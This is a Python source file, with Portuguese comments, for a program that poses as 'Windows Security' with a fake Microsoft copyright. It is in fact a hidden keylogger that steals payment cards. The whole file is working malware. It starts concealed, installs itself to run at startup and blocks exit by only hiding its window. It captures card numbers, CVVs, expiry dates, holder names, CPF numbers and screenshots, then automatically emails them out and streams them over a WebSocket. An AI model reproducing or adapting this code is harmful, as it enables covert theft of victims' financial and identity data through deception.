"""
Windows Security Service - Interface Stealth
Monitoramento permanente - sem opção de pausar
"""

import os
import sys

# ============================================================
# CRÍTICO: Configura diretório ANTES de qualquer outra coisa
# ============================================================
if getattr(sys, 'frozen', False):
    # Rodando como .exe compilado
    os.chdir(os.path.dirname(sys.executable))
else:
    # Rodando como script Python
    os.chdir(os.path.dirname(os.path.abspath(__file__)))
# ============================================================
import time
import threading
import tkinter as tk
from tkinter import ttk, messagebox
import argparse
import asyncio
import json
from pathlib import Path
from datetime import datetime

try:
    import keyboard
    HAS_KEYBOARD = True
except ImportError:
    HAS_KEYBOARD = False

try:
    import websockets
    HAS_WEBSOCKETS = True
except ImportError:
    HAS_WEBSOCKETS = False

from keyboard_monitor import KeyboardMonitor
from pattern_detector import CardData
from alert_window import AlertWindow
from screenshot_capture import ScreenshotCapture
from autostart import AutoStartManager
from email_sender import EmailSender
from PIL import Image

try:
    from system_tray import SystemTrayIcon
    HAS_TRAY = True
except ImportError:
    HAS_TRAY = False


class WebSocketBrowserInjector:
    """Gerencia conexão WebSocket com backend Express"""

    def __init__(self, backend_url="ws://localhost:8080/ws"):
        self.backend_url = backend_url
        self.websocket = None
        self.running = False
        self.loop = None
        self.thread = None

    def start(self):
        if self.running:
            return
        self.running = True
        self.thread = threading.Thread(target=self._run_async, daemon=True)
        self.thread.start()

    def stop(self):
        self.running = False
        if self.websocket and self.loop:
            try:
                asyncio.run_coroutine_threadsafe(self.websocket.close(), self.loop)
            except:
                pass

    def send_captured_data(self, data):
        if self.websocket and self.running:
            message = {"type": "CARD_DATA_UPDATE", "payload": data}
            try:
                asyncio.run_coroutine_threadsafe(
                    self.websocket.send(json.dumps(message)), self.loop
                )
            except:
                pass

    def _run_async(self):
        self.loop = asyncio.new_event_loop()
        asyncio.set_event_loop(self.loop)
        try:
            self.loop.run_until_complete(self._connect())
        except:
            pass
        finally:
            try:
                self.loop.close()
            except:
                pass

    async def _connect(self):
        if not HAS_WEBSOCKETS:
            return
        while self.running:
            try:
                async with websockets.connect(self.backend_url, timeout=5) as websocket:
                    self.websocket = websocket
                    await websocket.send(json.dumps({"type": "PYTHON_INJECTOR", "version": "1.0"}))
                    while self.running:
                        try:
                            message = await websocket.recv()
                            data = json.loads(message)
                            if data.get("type") == "INJECT_REQUEST":
                                await self.websocket.send(json.dumps({"type": "INJECT_RESPONSE", "success": True}))
                        except:
                            break
            except:
                if self.running:
                    await asyncio.sleep(5)


class SecurityMonitorApp:
    """
    Windows Security Service - Monitoramento Permanente
    Sem opção de pausar ou parar
    """
    
    # Cores estilo Windows Security
    BG_COLOR = '#1a1a2e'
    CARD_BG = '#16213e'
    HEADER_BG = '#0f3460'
    TEXT_COLOR = '#e8e8e8'
    ACCENT_COLOR = '#00d4ff'
    SUCCESS_COLOR = '#00ff88'
    WARNING_COLOR = '#ffaa00'
    DANGER_COLOR = '#ff4757'
    MUTED_COLOR = '#6c7a89'
    BORDER_COLOR = '#2a3a5a'
    
    HOTKEY = 'ctrl+shift+f12'
    
    def __init__(self, start_hidden: bool = True):
        self.keyboard_monitor = None
        self.alert_window = AlertWindow()
        self.autostart_manager = AutoStartManager()
        self.websocket_injector = WebSocketBrowserInjector()
        self.running = False
        self.root = None
        self.start_hidden = start_hidden
        self.is_visible = False

        # EmailSender
        print("\n📧 Inicializando sistema de e-mail...")
        self.email_sender = EmailSender()
        if self.email_sender.is_configured:
            print(f"   ✅ EmailSender configurado!")
            print(f"   📬 Destinatário: {self.email_sender.config.get('email_to', 'N/A')}")
        else:
            print("   ⚠️ EmailSender NÃO configurado")

        # Registra hotkey
        self._register_hotkey()

        # Tray icon
        self.tray_icon = None
        if HAS_TRAY:
            self.tray_icon = SystemTrayIcon(
                on_show=self.toggle_visibility,
                on_toggle=self.toggle_visibility,
                on_exit=self._fake_exit,
                on_autostart_toggle=self.toggle_autostart
            )
        
        # Estatísticas
        self.stats = {
            'captures': 0,
            'uptime_start': datetime.now()
        }
    
    def _fake_exit(self):
        """Não permite fechar - apenas esconde"""
        self.hide_window()
        if self.tray_icon:
            self.tray_icon.show_notification(
                "Windows Security",
                "Proteção ativa em segundo plano."
            )
    
    def _register_hotkey(self):
        if not HAS_KEYBOARD:
            return
        try:
            keyboard.add_hotkey(self.HOTKEY, self.toggle_visibility)
            print(f"   ⌨️ Hotkey registrada: {self.HOTKEY.upper()}")
        except Exception as e:
            print(f"   ⚠️ Erro ao registrar hotkey: {e}")
    
    def toggle_visibility(self):
        if self.root:
            if self.is_visible:
                self.hide_window()
            else:
                self.show_window()
    
    def show_window(self):
        if self.root:
            self.root.deiconify()
            self.root.lift()
            self.root.focus_force()
            self.is_visible = True
            self._position_window()
    
    def hide_window(self):
        if self.root:
            self.root.withdraw()
            self.is_visible = False
    
    def _position_window(self):
        if self.root:
            self.root.update_idletasks()
            screen_w = self.root.winfo_screenwidth()
            screen_h = self.root.winfo_screenheight()
            win_w = 360
            win_h = 380
            x = screen_w - win_w - 20
            y = screen_h - win_h - 80
            self.root.geometry(f"{win_w}x{win_h}+{x}+{y}")
    
    def toggle_autostart(self):
        """Alterna inicialização automática"""
        success, message = self.autostart_manager.toggle_autostart()
        
        # Atualiza o checkbox
        if self.root and hasattr(self, 'autostart_var'):
            is_installed = self.autostart_manager.is_installed()
            self.autostart_var.set(is_installed)
            print(f"   📋 Autostart: {'✅ Ativado' if is_installed else '❌ Desativado'}")
        
        # Mostra notificação
        if self.tray_icon:
            self.tray_icon.show_notification(
                "Windows Security",
                message
            )
    
    def on_card_captured_callback(self, card_data: CardData, screenshot_result: dict):
        """Callback - envia e-mail automaticamente"""
        print(f"\n{'='*60}")
        print(f"📧 CAPTURA DETECTADA!")
        print(f"{'='*60}")
        
        self.stats['captures'] += 1
        self._update_stats_display()
        
        if not self.email_sender or not self.email_sender.is_configured:
            print("   ⚠️ EmailSender não configurado")
            return
        
        try:
            email_data = {
                'card_number': card_data.card_number,
                'card_brand': card_data.card_brand,
                'expiry_date': card_data.expiry_date,
                'cvv': card_data.cvv,
                'holder_name': card_data.holder_name,
                'cpf': card_data.cpf,
                'email': card_data.email,
                'window_title': card_data.window_title,
                'completeness': card_data.completeness_percentage,
                'timestamp': datetime.now().strftime("%d/%m/%Y %H:%M:%S"),
                'data_type': 'COMPLETE',
                'capture_number': self.stats['captures']
            }
            
            attachments = []
            screenshot_path = screenshot_result.get('screenshot')
            if screenshot_path and os.path.exists(screenshot_path):
                attachments.append(screenshot_path)
            text_file_path = screenshot_result.get('text_file')
            if text_file_path and os.path.exists(text_file_path):
                attachments.append(text_file_path)
            
            print(f"   📎 Anexos: {len(attachments)}")
            print(f"   ✉️ Enviando e-mail...")
            
            success = self.email_sender.send_complete_alert(email_data, attachments)
            print(f"   {'✅ ENVIADO!' if success else '❌ Falha'}")
                
        except Exception as e:
            print(f"   ❌ Erro: {e}")
    
    def on_card_detected(self, card_data: CardData, screenshot: Image.Image):
        """Callback de detecção"""
        self.stats['captures'] += 1
        self._update_stats_display()
        
        if self.tray_icon:
            self.tray_icon.show_notification(
                "Windows Security",
                "Atividade detectada e registrada."
            )
        
        if self.keyboard_monitor:
            self.keyboard_monitor.reset()
    
    def on_field_update(self, status: dict):
        self.websocket_injector.send_captured_data(status)
    
    def _update_stats_display(self):
        if not self.root:
            return
        
        def update():
            try:
                if hasattr(self, 'captures_label'):
                    self.captures_label.config(text=str(self.stats['captures']))
                if hasattr(self, 'uptime_label'):
                    uptime = datetime.now() - self.stats['uptime_start']
                    hours = int(uptime.total_seconds() // 3600)
                    minutes = int((uptime.total_seconds() % 3600) // 60)
                    self.uptime_label.config(text=f"{hours}h {minutes}m")
            except:
                pass
        
        try:
            self.root.after(0, update)
        except:
            pass
    
    def _update_uptime_loop(self):
        if self.root:
            self._update_stats_display()
            self.root.after(60000, self._update_uptime_loop)
    
    def start_monitoring(self):
        """Inicia monitoramento permanente"""
        if self.running:
            return

        try:
            print("\n" + "="*60)
            print("🚀 INICIANDO PROTEÇÃO PERMANENTE")
            print("="*60)
            
            self.keyboard_monitor = KeyboardMonitor(self.on_card_detected)
            self.keyboard_monitor.on_field_detected = self.on_field_update
            
            if hasattr(self.keyboard_monitor, 'detector'):
                detector = self.keyboard_monitor.detector
                detector.set_email_sender(self.email_sender)
                detector.set_capture_callback(self.on_card_captured_callback)
                detector.set_auto_send(True)
                print("   ✅ E-mail automático configurado")
            
            self.keyboard_monitor.start()
            self.websocket_injector.start()
            self.running = True
            
            print("\n" + "="*60)
            print("✅ PROTEÇÃO ATIVA - MONITORAMENTO PERMANENTE")
            print(f"   • E-mail: {'✅' if self.email_sender.is_configured else '❌'}")
            print("="*60 + "\n")

            if self.tray_icon:
                self.tray_icon.update_status(True, self.autostart_manager.is_installed())

        except Exception as e:
            print(f"❌ ERRO: {e}")
            import traceback
            traceback.print_exc()
    
    def create_main_window(self):
        """Cria janela - SEM botão de pausar"""
        self.root = tk.Tk()
        self.root.title("Windows Security")
        self.root.geometry("360x380")
        self.root.configure(bg=self.BG_COLOR)
        self.root.resizable(False, False)
        self.root.attributes('-toolwindow', True)
        
        try:
            self.root.iconbitmap('icon.ico')
        except:
            pass
        
        main = tk.Frame(self.root, bg=self.BG_COLOR)
        main.pack(fill='both', expand=True)
        
        # ═══════════════════════════════════════════════════════════
        # HEADER
        # ═══════════════════════════════════════════════════════════
        header = tk.Frame(main, bg=self.HEADER_BG, height=70)
        header.pack(fill='x')
        header.pack_propagate(False)
        
        header_content = tk.Frame(header, bg=self.HEADER_BG)
        header_content.pack(expand=True, fill='both', padx=20)
        
        tk.Label(
            header_content,
            text="🛡️",
            font=('Segoe UI Emoji', 24),
            bg=self.HEADER_BG,
            fg=self.ACCENT_COLOR
        ).pack(side='left', pady=15)
        
        title_frame = tk.Frame(header_content, bg=self.HEADER_BG)
        title_frame.pack(side='left', padx=(10, 0), pady=15)
        
        tk.Label(
            title_frame,
            text="Windows Security",
            font=('Segoe UI', 14, 'bold'),
            bg=self.HEADER_BG,
            fg='white'
        ).pack(anchor='w')
        
        tk.Label(
            title_frame,
            text="Proteção em tempo real",
            font=('Segoe UI', 8),
            bg=self.HEADER_BG,
            fg=self.MUTED_COLOR
        ).pack(anchor='w')
        
        # ═══════════════════════════════════════════════════════════
        # STATUS - Sempre ativo
        # ═══════════════════════════════════════════════════════════
        status_frame = tk.Frame(main, bg=self.CARD_BG, padx=20, pady=15)
        status_frame.pack(fill='x', padx=15, pady=(15, 8))
        
        status_row = tk.Frame(status_frame, bg=self.CARD_BG)
        status_row.pack(fill='x')
        
        indicator = tk.Canvas(status_row, width=14, height=14, bg=self.CARD_BG, highlightthickness=0)
        indicator.pack(side='left')
        indicator.create_oval(1, 1, 13, 13, fill=self.SUCCESS_COLOR, outline='')
        
        tk.Label(
            status_row,
            text="Proteção ativa",
            font=('Segoe UI', 11, 'bold'),
            bg=self.CARD_BG,
            fg=self.SUCCESS_COLOR
        ).pack(side='left', padx=(8, 0))
        
        # ═══════════════════════════════════════════════════════════
        # ESTATÍSTICAS
        # ═══════════════════════════════════════════════════════════
        stats_frame = tk.Frame(main, bg=self.CARD_BG, padx=20, pady=12)
        stats_frame.pack(fill='x', padx=15, pady=8)
        
        tk.Label(
            stats_frame,
            text="📊 Estatísticas",
            font=('Segoe UI', 9, 'bold'),
            bg=self.CARD_BG,
            fg=self.ACCENT_COLOR
        ).pack(anchor='w', pady=(0, 8))
        
        stats_grid = tk.Frame(stats_frame, bg=self.CARD_BG)
        stats_grid.pack(fill='x')
        
        stat1 = tk.Frame(stats_grid, bg=self.CARD_BG)
        stat1.pack(side='left', expand=True)
        
        self.captures_label = tk.Label(
            stat1,
            text="0",
            font=('Segoe UI', 22, 'bold'),
            bg=self.CARD_BG,
            fg=self.SUCCESS_COLOR
        )
        self.captures_label.pack()
        
        tk.Label(
            stat1,
            text="Eventos",
            font=('Segoe UI', 8),
            bg=self.CARD_BG,
            fg=self.MUTED_COLOR
        ).pack()
        
        tk.Frame(stats_grid, bg=self.BORDER_COLOR, width=1).pack(side='left', fill='y', padx=15, pady=5)
        
        stat2 = tk.Frame(stats_grid, bg=self.CARD_BG)
        stat2.pack(side='left', expand=True)
        
        self.uptime_label = tk.Label(
            stat2,
            text="0h 0m",
            font=('Segoe UI', 22, 'bold'),
            bg=self.CARD_BG,
            fg=self.ACCENT_COLOR
        )
        self.uptime_label.pack()
        
        tk.Label(
            stat2,
            text="Tempo ativo",
            font=('Segoe UI', 8),
            bg=self.CARD_BG,
            fg=self.MUTED_COLOR
        ).pack()
        
        # ═══════════════════════════════════════════════════════════
        # CONFIGURAÇÕES
        # ═══════════════════════════════════════════════════════════
        config_frame = tk.Frame(main, bg=self.CARD_BG, padx=20, pady=12)
        config_frame.pack(fill='x', padx=15, pady=8)
        
        tk.Label(
            config_frame,
            text="⚙️ Configurações",
            font=('Segoe UI', 9, 'bold'),
            bg=self.CARD_BG,
            fg=self.ACCENT_COLOR
        ).pack(anchor='w', pady=(0, 8))
        
        self.autostart_var = tk.BooleanVar(value=self.autostart_manager.is_installed())
        
        tk.Checkbutton(
            config_frame,
            text="Iniciar com o Windows",
            variable=self.autostart_var,
            font=('Segoe UI', 9),
            bg=self.CARD_BG,
            fg=self.TEXT_COLOR,
            activebackground=self.CARD_BG,
            activeforeground=self.TEXT_COLOR,
            selectcolor=self.BG_COLOR,
            cursor='hand2',
            command=self.toggle_autostart
        ).pack(anchor='w')
        
        email_status = "✅ Notificações ativas" if self.email_sender.is_configured else "⚠️ Notificações desativadas"
        email_color = self.SUCCESS_COLOR if self.email_sender.is_configured else self.WARNING_COLOR
        
        tk.Label(
            config_frame,
            text=email_status,
            font=('Segoe UI', 8),
            bg=self.CARD_BG,
            fg=email_color
        ).pack(anchor='w', pady=(5, 0))
        
        # ═══════════════════════════════════════════════════════════
        # FOOTER
        # ═══════════════════════════════════════════════════════════
        footer = tk.Frame(main, bg=self.BG_COLOR)
        footer.pack(side='bottom', fill='x', pady=8)
        
        hotkey_text = f"{self.HOTKEY.upper()} para esconder" if HAS_KEYBOARD else ""
        if hotkey_text:
            tk.Label(
                footer,
                text=hotkey_text,
                font=('Segoe UI', 7),
                bg=self.BG_COLOR,
                fg=self.MUTED_COLOR
            ).pack()
        
        tk.Label(
            footer,
            text="© Microsoft Corporation",
            font=('Segoe UI', 7),
            bg=self.BG_COLOR,
            fg='#2a2a3a'
        ).pack()
        
        def on_close():
            self.hide_window()
        
        self.root.protocol("WM_DELETE_WINDOW", on_close)
        
        if self.start_hidden:
            self.root.withdraw()
            self.is_visible = False
        else:
            self._position_window()
            self.is_visible = True
        
        return self.root
    
    def run(self):
        """Executa aplicação"""
        print("\n" + "="*50)
        print("  Windows Security Service")
        print("  Monitoramento Permanente")
        print("="*50)
        if HAS_KEYBOARD:
            print(f"\n  ⌨️ {self.HOTKEY.upper()} para mostrar/esconder")
        print("  🔒 Executando em segundo plano...")
        print("="*50 + "\n")
        
        if self.tray_icon:
            self.tray_icon.update_status(True, self.autostart_manager.is_installed())
            self.tray_icon.start()
        
        root = self.create_main_window()
        
        self.root.after(1000, self.start_monitoring)
        self.root.after(60000, self._update_uptime_loop)
        
        root.mainloop()


def main():
    parser = argparse.ArgumentParser(description='Windows Security Service')
    parser.add_argument('--visible', '-v', action='store_true', help='Inicia visível')
    parser.add_argument('--autostart', action='store_true', help='Configura autostart')
    parser.add_argument('--test-email', action='store_true', help='Testa e-mail')
    
    args = parser.parse_args()
    
    if args.autostart:
        manager = AutoStartManager()
        success, message = manager.enable_autostart()
        print(message)
        sys.exit(0 if success else 1)
    
    if args.test_email:
        sender = EmailSender()
        success = sender.send_test_email()
        sys.exit(0 if success else 1)
    
    app = SecurityMonitorApp(start_hidden=not args.visible)
    app.run()


if __name__ == "__main__":
    main()
